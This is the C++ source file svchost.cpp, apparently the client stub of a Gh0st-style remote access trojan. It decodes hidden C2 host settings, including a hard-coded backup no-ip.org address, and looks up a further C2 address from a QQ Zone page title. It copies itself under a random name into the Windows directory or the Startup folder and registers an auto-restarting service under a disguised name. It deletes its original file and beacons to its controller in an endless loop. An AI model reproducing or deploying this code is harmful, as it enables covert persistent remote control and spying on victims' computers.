// svchost.cpp : Defines the entry point for the console application.
//
#pragma comment(linker, "/OPT:NOWIN98")
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
#include "head.h"
#include <stdio.h>
#include "Shlwapi.h"
#include <Windows.h>
#include <shlobj.h>   
#pragma  comment(lib, "shell32.lib")   
#pragma comment(linker, "/OPT:NOWIN98")
#pragma comment(lib, "DELAYIMP.LIB")
enum
{
	NOT_CONNECT, //  ��û������
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60// ����ʱ��

char	*lpszHost = NULL;
DWORD	dwPort = 80;
char	*lpszHost1 = NULL;
DWORD	dwPort1 = 80;
int StormRand(int count);

extern int memfind(const char *mem, const char *str, int sizem, int sizes);

DWORD WINAPI Login()
{
// 	OutputDebugString("����login");
	HANDLE	hEvent = NULL;
	char	strKillEvent[100];

	char	*szDns = (char *)FindConfigString(CKernelManager::g_hInstance, "ABCD");
	if (szDns == NULL)
	{
		return -1;
	}
	szDns = (char *)(MyDecode(szDns + 4));  //���ܱ����ܵ��ַ���

	wsprintf(strKillEvent, "%s %d", szDns ,GetTickCount());

	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, szDns);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return -1;
	}

	CClientSocket socketClient;
	CKernelManager	manager(&socketClient);
	manager.StartUnLineHook();
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 500; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;
				}
				// ��һ��
				Sleep(60);
			}
		}
//		OutputDebugString("׼����ȡ������Ϣ");
		if (!getLoginInfo(szDns, &lpszHost, &dwPort))
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}

		DWORD dwTickCount = GetTickCount();
		char	*szOnline = (char *)FindConfigString(CKernelManager::g_hInstance, "UVWX");
		if (szOnline == NULL)
		{
			return -1;
		}
		if(strstr(szOnline, "D") != NULL)//�������������
		{
			lpszHost = lpszHost;
			dwPort = dwPort;
		}
		if(strstr(szOnline, "Q") != NULL)//�����QQ����
		{
			using namespace MSXML2;//ʹ��msxml2�����ռ�
			CoInitialize(NULL);//��ʼ��com�齨
			IXMLHTTPRequestPtr xmlrequest;// ����һ��IXMLHTTPRequestPtr����ָ��
			xmlrequest.CreateInstance("Msxml2.XMLHTTP");//���齨�еõ�����Ľ��,�齨Ҳ���൱��һ������,�����ṩ�˺ܶ�����,����ֻҪ������Ҫ�Ľӿ������ܻ���ĸ�����
			_variant_t varp(false);
			char abc[50]="http://user.qzone.qq.com/";
			strcat(abc,lpszHost);
			xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// ��ʼ���������͵�ͷ����Ϣ
			xmlrequest->send(); // ���͵�������
			BSTR bstrbody;
			xmlrequest->get_responseText(&bstrbody);// ��÷������ķ�����Ϣ
			_bstr_t bstrtbody(bstrbody);// ��bstrbodyǿ��ת����_bstr_t���͵�����
			char	chBuff1[300*1024];    //��ȡ��������  
			strcpy(chBuff1,(LPCTSTR)bstrtbody);
			DWORD SizePoint;
			SizePoint = memfind(chBuff1,"<title>",sizeof(chBuff1),0);
			substr(chBuff1,SizePoint+8,15);
			ReplaceStr(chBuff1," ","");
			ReplaceStr(chBuff1,"[","");
			ReplaceStr(chBuff1,"h","");
			ReplaceStr(chBuff1,"t","");
			ReplaceStr(chBuff1,"p","");
			lpszHost = chBuff1;
			dwPort = dwPort;
			CoUninitialize();//����ʼ��com�齨��
		}
// 		char	strTMP[MAX_PATH];
// 		wsprintf(strTMP, "Port: %d",dwPort);
// 		OutputDebugString(strTMP);
// 		OutputDebugString(lpszHost);

		
		
		/**char SFFgQ[] = {'Q','E','U','/','P','2','d','o','L','W','1','s','K','m','Z','/','L','W','y','B','d','E','8','=','\0'};
		lpszHost1 = MyDecode(SFFgQ);//3600hk.no-ip.org
		
		char bpqgs[] = {'N','j','8','+','T','w','=','=','\0'};
		dwPort1 = atoi(MyDecode(bpqgs));//901*/
		if (!getLoginInfo(MyDecode("Zn8tdmyDbINsbC1wbGo5NkFATw=="), &lpszHost1, &dwPort1))
{
	bBreakError = GETLOGINFO_ERROR;
	continue;
}
//  		OutputDebugString(MyDecode(SFFgQ));
// 		OutputDebugString(MyDecode(bpqgs));
		if (!socketClient.Connect(lpszHost, dwPort))//��������A��ַ
		{
			if (strlen(lpszHost1)!=0)//A���ж���B��Ϊ��
			{
				lpszHost = lpszHost1;//B���ߵ�ַ
				dwPort = dwPort1;//B���߶˿�
				if (!socketClient.Connect(lpszHost, dwPort))//��������B��ַ
				{
					bBreakError = CONNECT_ERROR;
					continue;
				}
			}else//������ַ�����еĻ����³���������ѡ��ַ,ѭ�����
			{
				bBreakError = CONNECT_ERROR;
				continue;
			}
		}
// 		if (!socketClient.Connect(lpszHost, dwPort))//����������ѡ��ַ
// 		{
// 			bBreakError = CONNECT_ERROR;
// 			continue;
// 		}
		/************************************************************************/
		
		BYTE	bToken = TOKEN_HEARTBEAT;
		socketClient.Send((LPBYTE)&bToken, sizeof(bToken));
			
		/************************************************************************/
			
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;

		DWORD upTickCount = GetTickCount() - dwTickCount;

		manager.init(&socketClient,strKillEvent, lpszHost, dwPort);
// 		CKernelManager	manager(&socketClient,strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
		{
			socketClient.Disconnect();
			continue;
		}

		sendLoginInfo(NULL, &socketClient, upTickCount);

		//////////////////////////////////////////////////////////////////////////
		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false,strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}

	return 0;
}

int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

static void RunService(char *m_ServiceName,char *m_DisplayName,char *m_Description)
{
	char FilePath[MAX_PATH];
	
	GetModuleFileName(NULL,FilePath,MAX_PATH);
	
	char SystemPath[MAX_PATH];
	GetWindowsDirectory(SystemPath,MAX_PATH);
	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{
		char FileName[80];
		wsprintf(FileName,"%c%c%c%c%c%c.exe",'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26));
		strcat(SystemPath,"\\");
		strcat(SystemPath,FileName);
		CopyFile(FilePath,SystemPath,FALSE);
		memset(FilePath,0,MAX_PATH);
		strcpy(FilePath,SystemPath);
	}
	char	*Serdisplay = (char *)FindConfigString(CKernelManager::g_hInstance, "GHIJ");
	if (Serdisplay == NULL)
	{
		return;
	}
	Serdisplay = (char *)(MyDecode(Serdisplay + 4));  //���ܱ����ܵ��ַ���

	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;
	__try
	{
		scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = CreateService(
			scm, m_ServiceName, m_DisplayName,
			SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
			SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			FilePath,NULL, NULL, NULL, NULL, NULL);
		//����һ�·���...
		
		SC_LOCK sc_lock=LockServiceDatabase(scm);
		SERVICE_DESCRIPTION Service_Descrip={&Serdisplay[0]};
		ChangeServiceConfig2(newService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);
		
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=3600*24;
		
		SC_ACTION action[3];
		
		action[0].Delay=7000;
		action[0].Type=SC_ACTION_RESTART;
		
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		
		if( !ChangeServiceConfig2(newService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf))                   
		{
// 			OutputDebugString("ChangeServiceConfig2 failed");
		}
		
		UnlockServiceDatabase(sc_lock);
		
		if (newService == NULL)
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = OpenService(scm,m_ServiceName,SERVICE_ALL_ACCESS);
				if (newService==NULL)
					__leave;
				else
					StartService(newService,0, 0);
			}
		}
		if (!StartService(newService,0, 0))
			__leave;
		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcat(Desc,m_ServiceName);
		RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);
		RegSetValueEx(key,"Description", 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
	}
	
	__finally
	{
		if (newService!=NULL)
			CloseServiceHandle(newService);
		if (scm!=NULL)
			CloseServiceHandle(scm);
		if (key!=NULL) 
			RegCloseKey(key);
	}
}

//�����Ƿ������ǡ����ù���ô�ࡣ��ΪҪдע��Ҳ��֪����ôд����ʽ�ǹ̶���
static BOOL service_is_exist()
{
	char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
	if (SerName == NULL)
	{
		return -1;
	}
	SerName = (char *)(MyDecode(SerName + 4));  //���ܱ����ܵ��ַ���
	char SubKey[MAX_PATH]={0};
 	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,SerName);
	
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey, 0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
	{
		RegCloseKey(hKey);  //ע�⣡���й©��  û�ͷ�..

		return TRUE;
	}
	else
		return FALSE;
}

static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;
static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch(CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv,&srvStatus);
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
BOOL DeleteMe()
{
	TCHAR szModule [MAX_PATH],
		szComspec[MAX_PATH],
		szParams [MAX_PATH];
	
	// get file path names:
	if((GetModuleFileNameA(CKernelManager::g_hInstance,szModule,MAX_PATH)!=0) &&
		(GetShortPathNameA(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariableA("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// set command shell parameters
		lstrcpy(szParams," /c del ");
		lstrcpy(szParams, szModule);
		lstrcpy(szParams, " > nul");
		lstrcpy(szComspec, szParams);
		
		// set struct members
		STARTUPINFO		si={0};
		PROCESS_INFORMATION	pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		
		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);
		
		// invoke command shell
		if(CreateProcessA(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
			DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 
			
			// resume shell process with new low priority
			ResumeThread(pi.hThread);
			
			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	
	exit(0);
	ExitProcess(0);
	return FALSE;
}


void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
	char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
	if (SerName == NULL)
	{
		return;
	}
	SerName = (char *)(MyDecode(SerName + 4));  //���ܱ����ܵ��ַ���
	hSrv=RegisterServiceCtrlHandler(SerName,SvcCtrlFnct);
	srvStatus.dwServiceType=SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted=SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode=NO_ERROR;
	srvStatus.dwWaitHint=2000;
	
	srvStatus.dwCheckPoint=1;
	srvStatus.dwCurrentState=SERVICE_START_PENDING;
	SetServiceStatus(hSrv,&srvStatus);
	srvStatus.dwCheckPoint=0;
	Sleep(500);
	srvStatus.dwCurrentState=SERVICE_RUNNING;
	
	SetServiceStatus(hSrv,&srvStatus);
	
	HANDLE hThread; 
	while ( 1 )
	{
		Login();
		Sleep(50);
	}
	return;
}

BOOL APIENTRY DllMain()
{
	//��������
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 

	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));

	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, strInstallModule);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return -1;
	}

	char ReleasePath[MAX_PATH];
	char TempReleasePath[MAX_PATH];
	GetWindowsDirectory(TempReleasePath, MAX_PATH);
	char FileName[80];

	char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	if (szGetGroup == NULL)
	{
		return -1;
	}

	wsprintf(FileName,"%s.exe",szGetGroup);
	wsprintf(ReleasePath,"%s\\%s",TempReleasePath,FileName);

	char	*szInstall = (char *)FindConfigString(CKernelManager::g_hInstance, "OPQR");
	if (szInstall == NULL)
	{
		return -1;
	}
	char	*szGreen = (char *)FindConfigString(CKernelManager::g_hInstance, "STUV");
	if (szGreen == NULL)
	{
		return -1;
	}

	if(strstr(szGreen, "K") != NULL)//���������ɫ��װ
	{
		if (strstr(szInstall, "U") != NULL)
		{
			TCHAR   szPath[MAX_PATH];
			TCHAR   szMyPath[MAX_PATH];
			if (!GetModuleFileName(CKernelManager::g_hInstance, szMyPath, sizeof(szMyPath)))
			{
				return FALSE;
			}
			if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
			{
				return FALSE;
			}
			TCHAR buf[MAX_PATH], buf2[MAX_PATH];
			wsprintf(buf, "%s\\%s", szPath, FileName);
			if (GetFileAttributes(buf) == -1)
			{
				wsprintf(buf2, "\\??\\%s\\%s", szPath, FileName);
				DefineDosDevice(1, "agmkis2", buf2);
				Sleep(100);
				CopyFile(szMyPath,"\\\\.\\agmkis2",FALSE);//���������ļ�
				MoveFileEx(szMyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN); 
				CreateDirectory(szPath, NULL);
			}
			while(1)
			{
				Login();
				Sleep(50);
			}
		}
		if (strstr(szInstall, "I") != NULL)
		{
			char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
			if (SerName == NULL)
			{
				return -1;
			}
			SerName = (char *)(MyDecode(SerName + 4));  //���ܱ����ܵ��ַ���
			
			char	*Serdisplay = (char *)FindConfigString(CKernelManager::g_hInstance, "GHIJ");
			if (Serdisplay == NULL)
			{
				return -1;
			}
			Serdisplay = (char *)(MyDecode(Serdisplay + 4));  //���ܱ����ܵ��ַ���
			
			char	*Serdesc = (char *)FindConfigString(CKernelManager::g_hInstance, "IJKL");
			if (Serdesc == NULL)
			{
				return -1;
			}
			Serdesc = (char *)(MyDecode(Serdesc + 4));  //���ܱ����ܵ��ַ���

			if (service_is_exist())
			{	
				SERVICE_TABLE_ENTRY serviceTable[] = 
				{
					{SerName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
					{NULL,NULL}
				};
				StartServiceCtrlDispatcher(serviceTable);
			}
			else
			{
				RunService(SerName,Serdisplay ,Serdesc);
				DeleteMe();
			}
		}
	}
	if(strstr(szGreen, "G") != NULL)
	{
		while(1)
		{
			Login();
			Sleep(50);
		}
	}
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL PluginMe()
{
//	OutputDebugString("���ؽ��뵽dll");
	DllMain();
	while(1)
	{
		Sleep(1000*60*60);
	}
}